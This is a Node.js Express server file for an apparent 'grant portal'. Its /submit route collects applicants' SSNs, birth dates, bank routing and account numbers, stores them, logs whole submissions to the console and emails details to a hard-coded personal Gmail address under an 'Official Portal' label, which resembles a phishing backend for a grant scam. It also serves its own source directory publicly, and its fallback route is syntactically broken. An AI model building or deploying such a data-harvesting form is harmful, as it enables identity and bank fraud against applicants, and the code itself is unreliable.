import express from "express";
import mongoose from "mongoose";
import nodemailer from "nodemailer";
import bodyParser from "body-parser";
import cors from "cors";
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 5000;

// Allow requests from your frontend (adjust port if needed, usually 3000 or 5173)
app.use(cors({
  origin: "*", // For development only. In production, restrict to your domain.
  methods: ["POST", "GET"]
}));

app.use(bodyParser.json());

// --- SERVE STATIC FILES (Deployment) ---
// Serve static files from the 'dist' directory (standard build output)
// or current directory fallback if no build process is present
app.use(express.static(path.join(__dirname, 'dist')));
app.use(express.static(__dirname));

// --- DATABASE CONNECTION ---
// Ensure you have MongoDB running locally
const MONGO_URI = process.env.MONGO_URI || "mongodb://localhost:27017/grant_portal";

mongoose.connect(MONGO_URI)
  .then(() => console.log("Connected to MongoDB"))
  .catch(err => console.error("MongoDB connection error:", err));

// --- SCHEMA ---
// Matches the formData state in pages/Apply.tsx
const ApplicationSchema = new mongoose.Schema({
  grantId: { type: String, required: true },
  fullName: { type: String, required: true },
  dob: String,
  phone: String,
  email: { type: String, required: true },
  address: String,
  
  // Optional Security Field (SSN or EIN)
  ssn: String,
  
  // Banking Info (In production, these must be encrypted)
  bankName: String,
  routingNumber: String, // Mapped from 'branch' in frontend
  accountName: String,
  accountNumber: String,
  
  // Certification
  certification: Boolean,
  
  status: { type: String, default: "Pending Review" },
  submittedAt: { type: Date, default: Date.now },
});

const Application = mongoose.model("Application", ApplicationSchema);

// --- EMAIL TRANSPORT ---
// Configure with real SMTP credentials or use Ethereal for testing
const transporter = nodemailer.createTransport({
  service: "gmail", // Or your SMTP provider
  auth: {
    user: process.env.EMAIL_USER || "admin@example.com", 
    pass: process.env.EMAIL_PASS || "password",   
  },
});

// --- ROUTE TO HANDLE FORM SUBMISSION ---
app.post("/submit", async (req, res) => {
  try {
    console.log("Received submission:", req.body);
    
    // Map frontend 'branch' to 'routingNumber'
    const applicationData = {
      ...req.body,
      routingNumber: req.body.branch 
    };

    // 1. Save to Database
    const application = new Application(applicationData);
    await application.save();

    // 2. Send Admin Notification Email
    // Note: This block is wrapped in try/catch so DB save succeeds even if email fails (common in dev)
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER || "admin@example.com",
        to: "anne67j@gmail.com", // Specific recipient as requested
        subject: `New Grant Application: ${req.body.fullName}`,
        text: `
          New Application Received from Official Portal.
          
          --- APPLICANT DETAILS ---
          Name: ${req.body.fullName}
          DOB: ${req.body.dob}
          Email: ${req.body.email}
          Phone: ${req.body.phone}
          Address: ${req.body.address}
          
          --- GRANT DETAILS ---
          Program ID: ${req.body.grantId}
          
          --- BANKING & SECURITY ---
          Bank Name: ${req.body.bankName}
          Account Holder: ${req.body.accountName}
          (Sensitive account numbers stored securely in database)
          
          Status: Pending Review
          
          View full details in the secure dashboard.
        `,
      });
      console.log("Notification email sent to anne67j@gmail.com");
    } catch (emailError) {
      console.warn("Email failed to send (check credentials):", emailError.message);
    }

    // 3. Return Success
    res.status(200).json({ 
      success: true, 
      message: "Application securely archived.", 
      referenceId: application._id 
    });

  } catch (error) {
    console.error("Error saving application:", error);
    res.status(500).json({ success: false, message: "Internal Server Error" });
  }
});

// --- SPA FALLBACK ---
// Send index.html for any other requests to support client-side routing
app.get('/*', (req, res) => {
  res.send("Fallback route");
});

  res.sendFile(path.join(__dirname, 'index.html'));
});

// --- START SERVER ---
app.listen(PORT, () => console.log(`Server running securely on http://localhost:${PORT}`));
